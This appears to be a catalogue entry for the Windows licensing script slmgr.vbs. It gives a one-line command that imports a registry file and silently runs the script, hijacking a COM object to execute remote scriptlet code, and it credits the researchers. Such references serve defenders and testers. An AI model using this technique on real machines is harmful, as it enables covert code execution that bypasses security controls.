---
name: slmgr.vbs
description: Used by Windows to manage licenses.
functions:
  execute:
    - description: Hijack the Scripting.Dictionary COM Object to execute remote scriptlet (SCT) code.
      code: reg.exe import c:\path\to\Slmgr.reg & cscript.exe /b c:\windows\system32\slmgr.vbs
resources: 
    - resource: https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
    - resource: https://www.youtube.com/watch?v=3gz1QmiMhss
fullpath: 
    - path: c:\windows\system32\slmgr.vbs
    - path: c:\windows\sysWOW64\slmgr.vbs
notes: Thanks to Matt Nelson - @enigma0x3, Casey Smith - @subTee
---